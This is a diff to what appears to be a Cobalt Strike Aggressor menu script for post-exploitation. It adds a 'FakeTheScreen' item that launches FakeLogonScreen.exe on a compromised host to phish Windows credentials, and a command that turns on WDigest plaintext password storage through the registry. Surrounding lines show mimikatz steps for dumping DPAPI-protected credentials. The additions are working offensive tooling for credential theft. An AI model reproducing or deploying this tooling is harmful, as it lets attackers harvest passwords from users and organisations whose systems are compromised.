@@ -12,7 +12,7 @@ menu "辅助功能" {
 			blog($1,"查看本地保存的证书");
 			show_message("mimikatz dpapi::cred /in:路径获取到guidMasterKey\n再利用mimikatz sekurlsa::dpapi获取到对应guidMasterkey的MasterKey\n最后使用mimikatz dpapi::cred /in:路径 /MasterKey:xxx");
 	}
-
+	separator();
 
 	item "开启远程桌面" {
 	if( -isadmin $1['@'] )
@@ -26,7 +26,27 @@ menu "辅助功能" {
 	}
 
 	}
-
+	separator();
+	item "FakeTheScreen" {
+		$dialog = dialog("QAQ",%(bid => $1["@"] , os => "Win7") ,&FakerScreen);
+		dialog_description($dialog,"QAQ");
+		drow_combobox($dialog,"os","系统:",@("Win7","Win10"));
+		dbutton_action($dialog,"Exploit");
+		dialog_show($dialog);
+	}
+	separator();
+	item "启用Wdigest保存明文口令" {
+		if (-isadmin $1["@"])
+		{
+						binput($1["@"],"reg add HKLM\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
+			bshell($1["@"],"reg add HKLM\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
+		}
+		else
+		{
+				show_error("Permission Denied!");
+		}
+		}
+	separator();
 	item "测试" {
 		if( -isadmin $1['@'])
 		{
@@ -40,3 +60,14 @@ menu "辅助功能" {
 	}
 }
 
+
+sub FakerScreen {
+	if ($3["os"] eq "Win7")
+	{
+		bexecute_assembly($3["bid"],script_resource("./modules/fakelogonscreen_trunk/DOTNET35/FakeLogonScreen.exe"));
+	}
+	else
+	{
+		bexecute_assembly($3["bid"],script_resource("./modules/fakelogonscreen_trunk/FakeLogonScreen.exe"));
+	}
+}
